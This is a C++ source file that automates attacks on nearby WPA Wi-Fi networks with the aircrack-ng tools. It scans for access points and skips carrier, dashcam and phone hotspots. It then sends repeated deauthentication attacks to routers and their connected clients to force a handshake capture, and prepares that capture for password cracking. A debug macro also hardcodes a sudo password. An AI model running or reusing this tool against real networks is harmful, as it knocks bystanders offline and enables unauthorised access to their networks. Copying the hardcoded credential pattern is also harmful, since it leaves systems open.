// airmonitor.cpp : Defines the entry point for the console application.
//

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sys/stat.h> 
#include <string>
#include <list>
#include <atomic>
#include <thread>
#include <mutex>
#include <memory>

#ifdef _DEBUG
#define SUDO "echo \"51211314\" | sudo -S sh -c "
#define STDOUTERR_OFF ""
#define STDERR_OFF ""
#define SEARCH_DURATION 5
#define DEAUTH_ATTACK_TIMES 3
#define DEAUTH_ATTACK_INTERVAL 5
#else
#define SUDO ""
#define STDOUTERR_OFF "2>/dev/null 1>&2"
#define STDERR_OFF "2>/dev/null"
#define SEARCH_DURATION 30
#define DEAUTH_ATTACK_TIMES 10
#define DEAUTH_ATTACK_INTERVAL 20
#endif

#define IW_PHY "phy0"
#define IMONITOR "oiramon"
#define CAPTURE_DIR "./capture"
#define SEC_TO_MS(sec) (sec * 1000000)

struct StationData
{
	char  mac[18] = { 0 };
	int   power = -1;
	char  bssid[18] = { 0 };

	bool operator < (const StationData& rhs) const { return power > rhs.power; }
};

struct WAPData
{
	char  bssid[18] = { 0 };
	int   channel = 0;
	int   power = -1;
	char  essid[33] = { 0 };
	std::list<StationData> stations;

	bool operator < (const WAPData& rhs) const { return channel == rhs.channel ? power > rhs.power : channel < rhs.channel; }
};

struct AirCrack
{
	std::thread handshaked_thread;
	std::thread deauthattack_thread;
	std::mutex stations_mutex;
	std::atomic<bool> running = ATOMIC_VAR_INIT(true);
	std::atomic<bool> handshaked = ATOMIC_VAR_INIT(false);
	char workpath[18] = { 0 };

	AirCrack(WAPData& wapdata);
	~AirCrack();
};

void clear();
std::list<WAPData> get_wap_from_csv(char* csv);
std::list<StationData> get_stations_from_csv(char* csv);

void skip(char*& offset, char*& end, int length)
{
	if (offset + length < end)
	{
		char* find = strchr(offset, ',');
		if (find)
			offset = find + 2;
	}
}

int main()
{
	clear();
	bool monitor_interface_added = false;
    char cmd[512] = { 0 };

    // check software interface mode could be add
	int iw_phy_status = 0;
	sprintf(cmd, "/sys/class/ieee80211/%s", IW_PHY);
	if (access(cmd, F_OK) == 0)
	{
		sprintf(cmd, "iw %s info", IW_PHY);
		FILE* iwinfo = popen(cmd, "r");
		if (iwinfo)
		{
			while (fgets(cmd, sizeof(cmd), iwinfo) != NULL)
			{
				switch (iw_phy_status)
				{
					case 0:
					if (strstr(cmd, "Supported interface modes:"))
						iw_phy_status = 1;
					break;

					case 1:
					if (strstr(cmd, "* monitor"))
						iw_phy_status = 2;
					break;

					case 2:
					if (strstr(cmd, "software interface modes (can always be added):"))
						iw_phy_status = 3;
					break;

					case 3:
					if (strstr(cmd, "* monitor"))
						iw_phy_status = 4;
					break;

					default: break;
				}
			}
			pclose(iwinfo);
		}
	}

	// check status of soft/hard is unblocked
	if (iw_phy_status == 4)
	{
		bool iw_phy_blocked = false;
		sprintf(cmd, "rfkill list %c", IW_PHY[3]);
		FILE* rfkill = popen(cmd, "r");
		if (rfkill)
		{
			while (fgets(cmd, sizeof(cmd), rfkill) != NULL)
			{
				if (strstr(cmd, "Soft blocked: yes"))
				{
					iw_phy_blocked = true;
					break;
				}
			}
			pclose(rfkill);
		}

		if (iw_phy_blocked)
		{
			sprintf(cmd, "rfkill unblock %c", IW_PHY[3]);
			system(cmd);
		}

		// add monitor interface
		sprintf(cmd, SUDO"\"iw phy %s interface add %s type monitor\"", IW_PHY, IMONITOR);
		system(cmd);
		monitor_interface_added = true;

		// check monitor mode is enabled
		bool monitor_mode_enabled = false;
		FILE* iwconfig = popen("iwconfig", "r");
		if (iwconfig)
		{
			while (fgets(cmd, sizeof(cmd), iwconfig) != NULL)
			{
				if(strstr(cmd, IMONITOR) && strstr(cmd, "IEEE 802.11  Mode:Monitor"))
				{
					monitor_mode_enabled = true;
					break;
				}
			}
			pclose(iwconfig);
		}

		if (monitor_mode_enabled)
		{
			// searching bssid
			std::atomic<bool> running(true);
			std::thread airodump_thread([=, &running]()
			{
				char elapsed_time[32] = { 0 };
				sprintf(elapsed_time, "%d", SEARCH_DURATION);

				char dumpcmd[1024] = { 0 };
				sprintf(dumpcmd, SUDO"\"airodump-ng %s -a -u 1 -I 1 --ignore-negative-one -o csv -w ./%s/wap\" 2>&1", 
					IMONITOR, CAPTURE_DIR);
				FILE* airodump = popen(dumpcmd, "r");
				if (airodump)
				{
					while (running)
					{
						fgets(dumpcmd, sizeof(dumpcmd), airodump);
						char* elapsed_begin = strstr(dumpcmd, "Elapsed: ");
						if (elapsed_begin)
						{
							char* elapsed_end = strchr(elapsed_begin + 9, ' ');
							char tmp[16] = { 0 };
							memcpy(tmp, elapsed_begin + 9, elapsed_end - elapsed_begin - 9);
							int elapsed_time = atoi(tmp);
							if (elapsed_time > SEARCH_DURATION)
							{
								running = false;
								break;
							}
						}

					}
					pclose(airodump);
				}
				return 0;
			});

			for (int n = 0; running && n < SEARCH_DURATION * 5; ++n)
				usleep(SEC_TO_MS(1));
			running = false;
			if (airodump_thread.joinable())
				airodump_thread.join();
		}
    }

	// analyse csv file
	char* csv = 0;
	FILE* fp = fopen(CAPTURE_DIR"/wap-01.csv", "rt");
	if (fp)
	{
		// read csv into memory
		fseek(fp, 0, SEEK_END);
		long length = ftell(fp);
		if (length > 0)
		{
			csv = new char[length + 1];
			csv[length] = 0;
			fseek(fp, 0, SEEK_SET);
			fread(csv, length, 1, fp);
		}
		fclose(fp);
	}

	// check csv is valid
	std::list<WAPData> wap_set;
	if (csv)
	{
		wap_set = get_wap_from_csv(csv);
		auto station_set = get_stations_from_csv(csv);
		delete[] csv;

		// add station mac to its own wap
		for (auto& station : station_set)
		{
			for (auto& wap : wap_set)
			{
				if (strcmp(wap.bssid, station.bssid) == 0)
				{
					wap.stations.push_back(station);
					break;
				}
			}
		}
	}

	#ifdef _DEBUG
	// write to file for debug
	if (!wap_set.empty())
	{
		FILE* fp;
		fp = fopen(CAPTURE_DIR"/wap.txt", "wt");
		if (fp)
		{
			for (auto& wap : wap_set)
			{
				fprintf(fp, "wap -   bssid: %s, power: %3d, channel: %2d, essid: %s\n", wap.bssid, wap.power, wap.channel, wap.essid);
				for (auto& station : wap.stations)
				{
					fprintf(fp, "station - mac: %s, power: %3d\n", station.mac, station.power);
				}
			}
			fclose(fp);
		}
	}
	#endif

	if (!wap_set.empty())
	{
		// multi-thread on same channel
		int channel = wap_set.front().channel;
		{
			// waiting to capture handbag of aps
			std::list<std::unique_ptr<AirCrack>> crack_set;
			for (auto& wap : wap_set)
			{
				if (channel == wap.channel)
				{
					crack_set.push_back(std::make_unique<AirCrack>(wap));
				}
				else
				{
					channel = wap.channel;
					crack_set.clear();
					crack_set.push_back(std::make_unique<AirCrack>(wap));
				}
			}
		}
	}
 
	clear();
	if (monitor_interface_added)
	{
		sprintf(cmd, SUDO"\"iw %s del\"", IMONITOR);
		system(cmd);
	}

    return 0;
}

void clear()
{
	// remove csv/cap files for next airodump operation
    char cmd[128] = { 0 };
	sprintf(cmd, "mkdir %s 2>/dev/null", CAPTURE_DIR);
	system(cmd);
	sprintf(cmd, "rm -f %s/wap-*.* >/dev/null", CAPTURE_DIR);
	system(cmd);
}

std::list<WAPData> get_wap_from_csv(char* csv)
{
	// find bssid
	std::list<WAPData> wap_set;
	char* bss_begin = strstr(csv, "BSSID,");
	if (bss_begin)
	{
		char* station_begin = strstr(bss_begin, "Station MAC,");
		char* bss_end = station_begin ? station_begin - 2 : strrchr(csv, '\n');
		char* offset = strstr(bss_begin, ", Key\r\n");
		if (offset)
		{
			offset += 7; // strlen(", Key\r\n");

			while (offset < bss_end)
			{
				WAPData wap;
				// BSSID
				if (offset + sizeof(WAPData::bssid) < bss_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (size_t(find - offset) < sizeof(WAPData::bssid))
							memcpy(wap.bssid, offset, find - offset);
						offset = find + 2;
					}
				}

				// First time seen (skipped)
				skip(offset, bss_end, 20);

				// Last time seen (skipped)
				skip(offset, bss_end, 20);

				// Channel
				if (offset + 3 < bss_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (find - offset < 3)
						{
							char ch[3] = { 0 };
							memcpy(ch, offset, find - offset);
							wap.channel = atoi(ch);
						}
						offset = find + 2;
					}
				}

				// Speed (skipped)
				skip(offset, bss_end, 3);

				// Privacy
				char privacy[9] = { 0 };
				if (offset + sizeof(privacy) < bss_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (size_t(find - offset) < sizeof(privacy))
							memcpy(privacy, offset, find - offset);
						offset = find + 2;
					}
				}

				// Cipher (skipped)
				skip(offset, bss_end, 9);

				// Authentication (skipped)
				skip(offset, bss_end, 3);

				// Power
				if (offset + 4 < bss_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (find - offset < 4)
						{
							char pwr[4] = { 0 };
							memcpy(pwr, offset, find - offset);
							wap.power = atoi(pwr);
						}
						offset = find + 2;
					}
				}

				// Beacons (skipped)
				skip(offset, bss_end, 4);

				// IV (skipped)
				skip(offset, bss_end, 3);

				// LAN IP (skipped)
				skip(offset, bss_end, 17);

				// ID-length (skipped)
				skip(offset, bss_end, 2);

				// ESSID
				if (offset + sizeof(WAPData::essid) < bss_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (size_t(find - offset) < sizeof(WAPData::essid))
							memcpy(wap.essid, offset, find - offset);
						offset = find + 2;
					}
				}

				// Key
				if (offset < bss_end)
				{
					char* find = strchr(offset, '\n');
					if (find)
						offset = find + 1;
				}

				// check data is valid
				if (strstr(privacy, "WPA") && wap.power != -1 &&  wap.essid[0] &&
					// telecommunications operators
					!strstr(wap.essid, "CMCC") && !strstr(wap.essid, "and-Business") && !strstr(wap.essid, "ChinaNet") &&
					// tachograph
					!strstr(wap.essid, "HZTY") && !strstr(wap.essid, "DVR") && !strstr(wap.essid, "CarCam") && !strstr(wap.essid, "CAR") && 
					!strstr(wap.essid, "DV") && !strstr(wap.essid, "NISSAN") && !strstr(wap.essid, "Volvo") && !strstr(wap.essid, "LLD") && 
					!strstr(wap.essid, "SGM") && !strstr(wap.essid, "vYou_") && !strstr(wap.essid, "IOV") && !strstr(wap.essid, "golo") &&
					!strstr(wap.essid, "mini3_Pro") && !strstr(wap.essid, "70mai_d01") && !strstr(wap.essid, "HZA50") && !strstr(wap.essid, "SUNLINK") &&
					// phone
					!strstr(wap.essid, "iPhone") && !strstr(wap.essid, "vivo") && !strstr(wap.essid, "ZTE") && !strstr(wap.essid, "Honor"))
				{
					wap_set.emplace_back(wap);
				}
			}

			// sort by power
			wap_set.sort();
		}
	}

	return wap_set;
}

std::list<StationData> get_stations_from_csv(char* csv)
{
	std::list<StationData> station_set;
	// find station
	char* station_begin = csv ? strstr(csv, "Station MAC,") : 0;
	if (station_begin)
	{
		char* station_end = strrchr(csv, '\r');
		char* offset = strstr(station_begin, ", Probed ESSIDs");
		if (offset)
		{
			offset += 17; // strlen(", Probed ESSIDs\r\n");

			while (offset < station_end)
			{
				StationData station;
				// Station MAC
				if (offset + sizeof(StationData::mac) < station_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (size_t(find - offset) < sizeof(StationData::mac))
							memcpy(station.mac, offset, find - offset);
						offset = find + 2;
					}
				}

				// First time seen (skipped)
				skip(offset, station_end, 20);

				// Last time seen (skipped)
				skip(offset, station_end, 20);

				// Power
				if (offset + 4 < station_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (find - offset < 4)
						{
							char pwr[4] = { 0 };
							memcpy(pwr, offset, find - offset);
							station.power = atoi(pwr);
						}
						offset = find + 2;
					}
				}

				// packets
				skip(offset, station_end, 20);

				// BSSID
				if (offset + sizeof(StationData::bssid) < station_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (size_t(find - offset) < sizeof(StationData::bssid))
							memcpy(station.bssid, offset, find - offset);
						offset = find + 1;
					}
				}

				// Probed ESSIDs
				if (offset < station_end)
				{
					char* find = strchr(offset, '\n');
					if (find)
						offset = find + 1;
				}

				// check data is valid
				if (station.mac && station.power != -1)
				{
					station_set.emplace_back(station);
				}
			}
			station_set.sort();
		}
	}

	return station_set;
}

AirCrack::AirCrack(WAPData& wap)
{
	char* p = workpath;
	memcpy(workpath, wap.bssid, sizeof(workpath));
	while (p = strchr(p, ':')) *p = '-';

	char cmd[128] = { 0 };
	sprintf(cmd, "%s/%s", CAPTURE_DIR, workpath);
	mkdir(cmd, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);

	handshaked_thread = std::thread([this, &wap](){
		char cmd[1024] = { 0 };

		// monitoring wireless router with bssid
		sprintf(cmd, SUDO"\"airodump-ng %s -w ./%s/%s/ -c %d --bssid %s -u 1 -I 1 -o cap,csv\" 2>&1", 
			IMONITOR, CAPTURE_DIR, workpath, wap.channel, wap.bssid);
		FILE* airodump = popen(cmd, "r");
		if (airodump)
		{
			auto check_csv_interval = time(NULL);
			while(running)
			{
				fgets(cmd, sizeof(cmd), airodump);
				if (strstr(cmd, "handshake:"))
					handshaked = true;

				if (!handshaked)
				{
					if (wap.stations.empty() &&
						time(NULL) - check_csv_interval > 1)
					{
						check_csv_interval = time(NULL);
						// analyse csv file
						char* csv = 0;
						sprintf(cmd, "%s/%s/-01.csv", CAPTURE_DIR, workpath);
						FILE* fp = fopen(cmd, "rt");
						if (fp)
						{
							// read csv into memory
							fseek(fp, 0, SEEK_END);
							long length = ftell(fp);
							if (length > 0)
							{
								csv = new char[length + 1];
								csv[length] = 0;
								fseek(fp, 0, SEEK_SET);
								fread(csv, length, 1, fp);
							}
							fclose(fp);
						}

						if (csv)
						{
							auto stations = get_stations_from_csv(csv);
							delete[] csv;
							if(!stations.empty())
							{
								stations_mutex.lock();
								wap.stations.swap(stations);
								stations_mutex.unlock();
							}
						}
					}
				}
			}
			pclose(airodump);
		}
	});

	deauthattack_thread = std::thread([this, &wap](){
		char cmd[256] = { 0 };
		for (int n = 0; !handshaked && n < DEAUTH_ATTACK_TIMES; ++n)
		{
			// sending deauth attack to wap
			sprintf(cmd, SUDO"\"aireplay-ng -0 3 -a %s %s\" %s", wap.bssid, IMONITOR, STDOUTERR_OFF);
			system(cmd);

			// Let the bullet fly for a while
			usleep(SEC_TO_MS(DEAUTH_ATTACK_INTERVAL));

			stations_mutex.lock();
			auto stations = wap.stations;
			stations_mutex.unlock();

			// sending deauth attack to station
			if (!stations.empty())
			{
				for (auto& station : stations)
				{
					if (station.power != -1)
					{
						sprintf(cmd, SUDO"\"aireplay-ng -0 3 -a %s -c %s %s\" %s", wap.bssid, station.mac, IMONITOR, STDOUTERR_OFF);
						system(cmd);
					}
				}

				// Let the bullet fly for a while
				usleep(SEC_TO_MS(DEAUTH_ATTACK_INTERVAL));
			}
		}
		running = false;
		if (handshaked_thread.joinable())
			handshaked_thread.join();

		if (handshaked)
		{
			sprintf(cmd, "aircrack-ng %s/%s/-01.cap -j %s/%s_%s %s", CAPTURE_DIR, workpath, CAPTURE_DIR, wap.essid, workpath, STDERR_OFF);
			system(cmd);
		}
	});
}

AirCrack::~AirCrack()
{
	deauthattack_thread.join();

	char cmd[128] = { 0 };
	sprintf(cmd, "rm -fr %s/%s >/dev/null", CAPTURE_DIR, workpath);
	system(cmd);
}
